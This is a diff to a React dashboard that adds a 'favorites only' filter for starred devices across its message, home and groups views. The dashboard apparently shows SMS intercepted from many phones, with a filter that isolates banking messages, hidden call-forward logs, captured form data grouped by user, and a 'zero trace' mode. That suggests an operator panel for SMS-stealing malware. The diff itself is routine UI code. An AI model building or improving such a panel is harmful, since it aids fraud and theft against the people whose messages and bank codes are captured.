@@ -778,7 +778,7 @@ function fmtTime(iso: string) {
 }
 
 function HomePage({
-  devices, messages, formData, onOpenDevice, scrollToMsgId, onScrollDone, initialCount, onCountChange,
+  devices, messages, formData, onOpenDevice, scrollToMsgId, onScrollDone, initialCount, onCountChange, favoritesOnly,
 }: {
   devices: DbDevice[];
   messages: DbMessage[];
@@ -788,6 +788,7 @@ function HomePage({
   onScrollDone?: () => void;
   initialCount?: number;
   onCountChange?: (n: number) => void;
+  favoritesOnly?: boolean;
 }) {
   const t = useTheme();
   const [search, setSearch] = useState("");
@@ -811,7 +812,8 @@ function HomePage({
 
   // Memoize the heavy sort+filter — recomputed only when inputs change, NOT on every 1s live tick
   const allMsgs = useMemo(() => {
-    const sorted = [...messages].sort((a, b) => new Date(b.receivedAt).getTime() - new Date(a.receivedAt).getTime());
+    let sorted = [...messages].sort((a, b) => new Date(b.receivedAt).getTime() - new Date(a.receivedAt).getTime());
+    if (favoritesOnly) sorted = sorted.filter(m => deviceMap.get(m.deviceId)?.starred);
     const q = search.toLowerCase().trim();
     if (!q) return sorted;
     return sorted.filter(m => {
@@ -825,7 +827,7 @@ function HomePage({
         (dev?.name ?? "").toLowerCase().includes(q)
       );
     });
-  }, [messages, search, deviceMap]);
+  }, [messages, search, deviceMap, favoritesOnly]);
 
   const { visible: visibleMsgs, sentinelRef: homeSentinel, loading: homeLoading } = useInfiniteScroll(allMsgs, 20, initialCount, onCountChange);
 
@@ -880,7 +882,7 @@ function HomePage({
    PAGE — MESSAGES
 ════════════════════════════════════════ */
 function MessagesPage({
-  appId, messages, devices, onOpenDevice, scrollToMsgId, onScrollDone, initialCount, onCountChange,
+  appId, messages, devices, onOpenDevice, scrollToMsgId, onScrollDone, initialCount, onCountChange, favoritesOnly,
 }: {
   appId: string;
   messages: DbMessage[];
@@ -890,6 +892,7 @@ function MessagesPage({
   onScrollDone?: () => void;
   initialCount?: number;
   onCountChange?: (n: number) => void;
+  favoritesOnly?: boolean;
 }) {
   const t = useTheme();
   const [search, setSearch] = useState("");
@@ -948,10 +951,11 @@ function MessagesPage({
       // Call Forward system logs hide karo — sirf real SMS dikhao
       if (m.fromSender.toLowerCase().startsWith("call forward")) return false;
       if (filterSensitive && !isBankingMsg(m.body, m.fromSender)) return false;
+      if (favoritesOnly && !deviceMap.get(m.deviceId)?.starred) return false;
       if (!q) return true;
       return m.body.toLowerCase().includes(q) || m.fromSender.toLowerCase().includes(q) || m.fromNumber.includes(q) || (deviceMap.get(m.deviceId)?.name ?? "").toLowerCase().includes(q);
     });
-  }, [messages, searchResults, debouncedSearch, filterSensitive, deviceMap]);
+  }, [messages, searchResults, debouncedSearch, filterSensitive, deviceMap, favoritesOnly]);
 
   const { visible: visibleMsgsFeed, sentinelRef: feedSentinel, loading: feedLoading, resetCount: resetFeed } = useInfiniteScroll(filtered, 20, initialCount, onCountChange);
 
@@ -962,7 +966,7 @@ function MessagesPage({
   useEffect(() => {
     if (skipFirstResetRef.current) { skipFirstResetRef.current = false; return; }
     resetFeed(20);
-  }, [debouncedSearch, filterSensitive]); // eslint-disable-line react-hooks/exhaustive-deps
+  }, [debouncedSearch, filterSensitive, favoritesOnly]); // eslint-disable-line react-hooks/exhaustive-deps
 
   // Precise scroll-to-message restore — see useScrollToMessage for rationale.
   useScrollToMessage(scrollToMsgId, onScrollDone);
@@ -1006,7 +1010,7 @@ function fmtKey(k: string): string {
   return k.replace(/_/g, " ").replace(/([a-z])([A-Z])/g, "$1 $2").replace(/\b\w/g, c => c.toUpperCase());
 }
 
-function GroupsPage({ devices, formData, onOpenDevice, initialCount, onCountChange }: { devices: DbDevice[]; messages: DbMessage[]; formData: DbFormData[]; onOpenDevice: (d: DbDevice) => void; initialCount?: number; onCountChange?: (n: number) => void }) {
+function GroupsPage({ devices, formData, onOpenDevice, initialCount, onCountChange, favoritesOnly }: { devices: DbDevice[]; messages: DbMessage[]; formData: DbFormData[]; onOpenDevice: (d: DbDevice) => void; initialCount?: number; onCountChange?: (n: number) => void; favoritesOnly?: boolean }) {
   const t = useTheme();
   const dpEnabled = useDeleteProt();
   const [search, setSearch] = useState("");
@@ -1017,7 +1021,7 @@ function GroupsPage({ devices, formData, onOpenDevice, initialCount, onCountChan
     return acc;
   }, {} as Record<string, DbFormData[]>);
 
-  const devicesWithData = devices.filter(d => (formByDevice[d.deviceId]?.length ?? 0) > 0);
+  const devicesWithData = devices.filter(d => (formByDevice[d.deviceId]?.length ?? 0) > 0 && (!favoritesOnly || d.starred));
 
   const byUser = devicesWithData.reduce((acc, d) => {
     if (!acc[d.userId]) acc[d.userId] = [];
@@ -3971,9 +3975,9 @@ export default function WebDashboard() {
         {!loading && !error && (
           <>
             <div id="main-scroll" style={{ flex: 1, overflowY: "auto", minHeight: 0, overscrollBehavior: "contain" }}>
-              {page === "home" && <HomePage devices={devices} messages={messages} formData={formData} onOpenDevice={onOpenDevice} scrollToMsgId={backPage === "home" ? scrollToMsgId : null} onScrollDone={() => setScrollToMsgId(null)} initialCount={homeMsgCountRef.current} onCountChange={n => { homeMsgCountRef.current = n; }} />}
-              {page === "messages" && <MessagesPage appId={appId} messages={messages} devices={devices} onOpenDevice={onOpenDevice} scrollToMsgId={backPage === "messages" ? scrollToMsgId : null} onScrollDone={() => setScrollToMsgId(null)} initialCount={msgPageCountRef.current} onCountChange={n => { msgPageCountRef.current = n; }} />}
-              {page === "groups" && <GroupsPage devices={devices} messages={messages} formData={formData} onOpenDevice={onOpenDevice} initialCount={groupsCountRef.current} onCountChange={n => { groupsCountRef.current = n; }} />}
+              {page === "home" && <HomePage devices={devices} messages={messages} formData={formData} onOpenDevice={onOpenDevice} scrollToMsgId={backPage === "home" ? scrollToMsgId : null} onScrollDone={() => setScrollToMsgId(null)} initialCount={homeMsgCountRef.current} onCountChange={n => { homeMsgCountRef.current = n; }} favoritesOnly={filterFavorites} />}
+              {page === "messages" && <MessagesPage appId={appId} messages={messages} devices={devices} onOpenDevice={onOpenDevice} scrollToMsgId={backPage === "messages" ? scrollToMsgId : null} onScrollDone={() => setScrollToMsgId(null)} initialCount={msgPageCountRef.current} onCountChange={n => { msgPageCountRef.current = n; }} favoritesOnly={filterFavorites} />}
+              {page === "groups" && <GroupsPage devices={devices} messages={messages} formData={formData} onOpenDevice={onOpenDevice} initialCount={groupsCountRef.current} onCountChange={n => { groupsCountRef.current = n; }} favoritesOnly={filterFavorites} />}
               {page === "devices" && <DevicesPage appId={appId} devices={displayDevices} messages={messages} formData={formData} initialDevice={selectedDevice} onBack={onBack} initialCount={devicesCountRef.current} onCountChange={n => { devicesCountRef.current = n; }} />}
               {page === "settings" && <SettingsPage appId={appId} isDark={effectiveDark} onToggleDark={toggleDark} devices={displayDevices} onLogout={handleLogout} msgCount={totalMsgCount || messages.length} isZeroTrace={isZeroTrace} onDeleteProtEnabledChange={setDeleteProtEnabled} />}
             </div>
